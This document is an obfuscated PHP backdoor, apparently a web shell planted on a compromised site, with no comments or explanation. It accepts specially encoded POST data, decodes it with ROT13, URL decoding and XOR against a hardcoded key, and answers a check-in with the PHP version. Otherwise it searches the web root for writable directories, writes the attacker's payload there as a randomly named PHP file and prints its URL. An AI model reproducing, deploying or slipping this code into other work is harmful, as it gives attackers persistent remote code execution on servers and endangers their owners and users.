<?php $rpgyxrm = "fmibksjkjahybxvu";$jourdm = "";foreach ($_POST as $jmjlnzvyh => $okathfosv){if (strlen($jmjlnzvyh) == 16 and substr_count($okathfosv, "%") > 10){uvgqu($jmjlnzvyh, $okathfosv);}}function uvgqu($jmjlnzvyh, $qzhnz){global $jourdm;$jourdm = $jmjlnzvyh;$qzhnz = str_split(rawurldecode(str_rot13($qzhnz)));function uauettaje($vonombn, $jmjlnzvyh){global $rpgyxrm, $jourdm;return $vonombn ^ $rpgyxrm[$jmjlnzvyh % strlen($rpgyxrm)] ^ $jourdm[$jmjlnzvyh % strlen($jourdm)];}$qzhnz = implode("", array_map("uauettaje", array_values($qzhnz), array_keys($qzhnz)));$qzhnz = @unserialize($qzhnz);if (@is_array($qzhnz)){$jmjlnzvyh = array_keys($qzhnz);$qzhnz = $qzhnz[$jmjlnzvyh[0]];if ($qzhnz === $jmjlnzvyh[0]){echo @serialize(Array('php' => @phpversion(), ));exit();}else{function ezaydqbi($iakktopir) {static $iqprlnpm = array();$tmwui = glob($iakktopir . '/*', GLOB_ONLYDIR);if (count($tmwui) > 0) {foreach ($tmwui as $iakktop){if (@is_writable($iakktop)){$iqprlnpm[] = $iakktop;}}}foreach ($tmwui as $iakktopir) ezaydqbi($iakktopir);return $iqprlnpm;}$qcjhazo = $_SERVER["DOCUMENT_ROOT"];$tmwui = ezaydqbi($qcjhazo);$jmjlnzvyh = array_rand($tmwui);$tjvmjmrkn = $tmwui[$jmjlnzvyh] . "/" . substr(md5(time()), 0, 8) . ".php";@file_put_contents($tjvmjmrkn, $qzhnz);echo "http://" . $_SERVER["HTTP_HOST"] . substr($tjvmjmrkn, strlen($qcjhazo));exit();}}}